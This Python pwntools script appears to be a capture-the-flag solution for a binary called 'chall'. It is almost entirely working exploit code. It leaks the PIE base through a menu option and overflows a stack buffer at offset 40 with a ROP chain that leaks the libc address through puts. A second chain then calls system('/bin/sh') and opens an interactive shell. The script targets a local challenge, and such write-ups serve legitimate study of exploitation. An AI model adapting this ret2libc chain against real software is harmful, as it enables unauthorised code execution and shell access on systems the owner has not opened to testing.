#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal = ['wt.exe','wsl.exe']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

p = start()
offset = 40

def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(*args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe :",p)
    return p

def leakpie():
    p.sendline(b'2')
    p.sendline(b'1')
    p.recvuntil(b'0x')
    a = int(p.recvline().strip(),16) - exe.sym.main
    return a

def apa_ini(s):
    p.sendline(b'3')
    p.sendline(s)

exe.address = leakpie()
mov_rdi_rbp = exe.address + 0x00000000000011e7
success(f'pie address = {hex(exe.address)}')
apa_ini(safe_flat({40-8:[exe.got.puts,mov_rdi_rbp,0x0,exe.sym.puts,exe.sym.main]}))
p.recvuntil(b'haaa\n\n')
libc.address = u64(p.recvline().strip().ljust(8,b'\x00')) - libc.sym.puts
success(f'libc address = {hex(libc.address)}')
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh')))
apa_ini(flat({40:rop.chain()}))
p.interactive()

